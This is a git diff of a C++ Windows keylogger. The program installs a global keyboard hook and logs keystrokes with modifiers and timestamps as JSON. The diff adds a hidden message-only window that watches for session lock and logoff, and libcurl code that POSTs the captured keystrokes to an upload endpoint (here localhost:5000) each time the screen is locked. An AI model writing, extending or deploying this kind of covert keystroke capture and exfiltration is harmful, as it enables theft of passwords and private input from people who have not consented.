@@ -14,6 +14,11 @@ using json = nlohmann::ordered_json;
 //For Curl:
 #include <curl/curl.h>
 
+//Windows:
+#include <wtsapi32.h>
+
+#pragma comment(lib, "Wtsapi32.lib")
+
 
 //status symbols
 const char* k = "[+] ";
@@ -43,8 +48,13 @@ fs::path pOut;
 
 //json file
 json data;
+
+CURL* curl;
+
+
 std::string sJsonVersion = "0.0.0.1";
 int iEventCount = 0;
+
 
 //Add keyEvent to 'data'
 void addEvent(std::string key, bool mods[], int time){
@@ -81,11 +91,34 @@ void writeTofile(){
 }
 
 //Send the data to the webserver
+//bool sendData(CURL* curl, const std::string& payload){
 bool sendData(){
+	std::cout << i << "Sending data..." << std::endl;
 
+	std::string payload = data.dump(2);
 
-	return false;
+	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
+	curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, payload.size());
+
+	CURLcode result = curl_easy_perform(curl);
+
+	if (result != CURLE_OK){
+		std::cout << e << "Request Failed: " << curl_easy_strerror(result) << std::endl;
+		return false;
+	}
+
+	std::cout << k << "POST sent succesfully!" << std::endl;
+	return true;
 }
+
+//Curl Callback
+void WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
+	std::cout << i << "callback fired" << std::endl;
+}
+
+/*=========================================
+	Callback Functions
+=========================================*/
 
 //keyboard hook callback function
 LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
@@ -218,6 +251,8 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 			}
 
 			addEvent(sSwResult, mods, data.time);
+			//Debug:
+			//std::cout << i << sSwResult << std::endl;
 		}
 	}
 
@@ -226,20 +261,67 @@ LRESULT CALLBACK SomeProc(int code, WPARAM wParam, LPARAM lParam){
 	return CallNextHookEx(hHook, code, wParam, lParam);
 }
 
+//Window Callback
+LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam){
+	switch (uMsg)
+	{
+	//Catch lock/unlock
+	case WM_WTSSESSION_CHANGE:
+		if (wParam == WTS_SESSION_LOCK)
+		{	
+			std::cout << "User Locked Screen!" << std::endl;
+
+			//Send data to server!
+			sendData();
+		}
+		else if (wParam == WTS_SESSION_UNLOCK)
+			std::cout << "User Unlocked Screen!" << std::endl;
+		break;
+
+	//Catch shutdown or logoff
+	case WM_QUERYENDSESSION:
+		std::cout << "System is Shutting down or User is logging off." << std::endl;
+
+		return TRUE; //Allow Shutdown
+
+
+	case WM_ENDSESSION:
+		if (wParam)
+			std::cout << "Session is ending" << std::endl;
+		break;
+
+	}
+
+	//hand off to next window
+	return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
 
 // === Main ===
 int main(int argc, char* argv[]){
-
 	/*=========================================
 		CURL Setup
 	=========================================*/
 
-	CURL* curl = curl_easy_init();
+	//Global Initialization
+
+	curl = curl_easy_init();
 
 	if (!curl) {
 		std::cout << e << "libcurl unable to link, exiting..." << std::endl;
-		exit()
+		return 1;
 	}
+
+	// Set options that NEVER change
+	curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:5000/upload");
+	curl_easy_setopt(curl, CURLOPT_POST, 1L);
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+
+	// Static headers (create once)
+	struct curl_slist* headers = nullptr;
+	headers = curl_slist_append(headers, "Content-Type: application/json");
+	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
 
 	/*=========================================
 		Path Setup
@@ -284,13 +366,37 @@ int main(int argc, char* argv[]){
 
 	std::cout << k << "Hook succesfully installed!" << std::endl;
 
+	/*=========================================
+		Window Setup
+	=========================================*/
+	HINSTANCE hInstance = GetModuleHandle(NULL);
+
+	WNDCLASS wc = {};
+	wc.lpfnWndProc = WindowProc;
+	wc.hInstance = hInstance;
+	wc.lpszClassName = "HiddenWindowClass";
+	RegisterClass(&wc);
+
+	HWND hwnd = CreateWindowEx(0, "HiddenWindowClass", "temp", 0, 0,0,0,0,HWND_MESSAGE,NULL,hInstance, NULL);
+
+	WTSRegisterSessionNotification(hwnd, NOTIFY_FOR_THIS_SESSION);
+
+	std::cout << "Monitoring user state ..." << std::endl;
+
+
+	/*=========================================
+		Message Loop
+	=========================================*/
 	//Loop:
 	MSG msg;
 
 	while (GetMessage(&msg, 0, 0, 0)) {
 
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+
 		//continues msg through queue
-		PeekMessage(&msg, 0, 0, 0,PM_REMOVE);
+		//PeekMessage(&msg, 0, 0, 0,PM_REMOVE);
 	}
 
 	return WN_SUCCESS;
